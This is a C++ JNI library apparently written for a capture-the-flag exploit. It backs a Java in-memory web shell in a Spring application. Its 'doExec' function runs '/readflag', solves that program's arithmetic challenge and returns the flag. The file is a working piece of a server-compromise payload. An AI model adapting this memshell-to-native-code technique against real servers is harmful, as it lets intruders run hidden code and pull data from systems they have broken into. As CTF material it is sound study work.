#include<jni.h>
#include <ctime>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
#include <cstdio>
#include <cerrno>
#include "xyz_eki_marshalexp_memshell_MSpringJNIController.h"

static int start_subprocess(char *command[], int *pid, int *infd, int *outfd){
    int p1[2], p2[2];

    if (!pid || !infd || !outfd)
        return 0;

    if (pipe(p1) == -1)
        goto err_pipe1;
    if (pipe(p2) == -1)
        goto err_pipe2;
    if ((*pid = fork()) == -1)
        goto err_fork;

    if (*pid)
    {
        /* Parent process. */
        *infd = p1[1];
        *outfd = p2[0];
        close(p1[0]);
        close(p2[1]);
        return 1;
    }
    else
    {
        /* Child process. */
        dup2(p1[0], 0);
        dup2(p2[1], 1);
        close(p1[0]);
        close(p1[1]);
        close(p2[0]);
        close(p2[1]);
        execvp(*command, command);
        /* Error occured. */
        fprintf(stderr, "error running %s: %s", *command, strerror(errno));
        abort();
    }

err_fork:
    close(p2[1]);
    close(p2[0]);
err_pipe2:
    close(p1[1]);
    close(p1[0]);
err_pipe1:
    return 0;
}

int readnum(int infd)
{
    int sign = 1;
    char x;
    int val = 0;
    read(infd, &x, 1);
    if (x == '-')
    {
        sign = -1;
        read(infd, &x, 1);
    }
    while ( '0'<= x && x <= '9')
    {
        val *= 10;
        val += (x - '0');
        read(infd, &x, 1);
    }
    return val * sign;
}

void solve(char* buf){
    int pid, infd, outfd;
    char *cmd[2];
    cmd[0] = "/readflag";
    cmd[1] = 0;
    start_subprocess(cmd, &pid, &outfd, &infd);
    memset(buf,0,sizeof(buf));

    read(infd, buf, strlen("please answer the challenge below first:\n"));

    int a, b;

    a = readnum(infd);
    b = readnum(infd);


    int ans = a + b;
    char v_str[1000];
    sprintf(v_str, "%d\n", ans);

    write(outfd, v_str, strlen(v_str));
    memset(buf,0,sizeof(buf));
    read(infd, buf, 1000);
    read(infd, buf, 1000);
    read(infd, buf, 1000);
}

JNIEXPORT jstring JNICALL Java_xyz_eki_marshalexp_memshell_MSpringJNIController_doExec(JNIEnv *env, jobject thisObj,jstring jstr) {
    const char *cstr = env->GetStringUTFChars(jstr, NULL);
    char result[1024];
    solve(result);

    char return_messge[1024] = "";
    strcat(return_messge, result);
    jstring cmdresult = env->NewStringUTF(return_messge);
    //system();

    return cmdresult;
}

JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM* vm, void* reserved){
    return JNI_VERSION_1_4; //这里很重要，必须返回版本，否则加载会失败。
}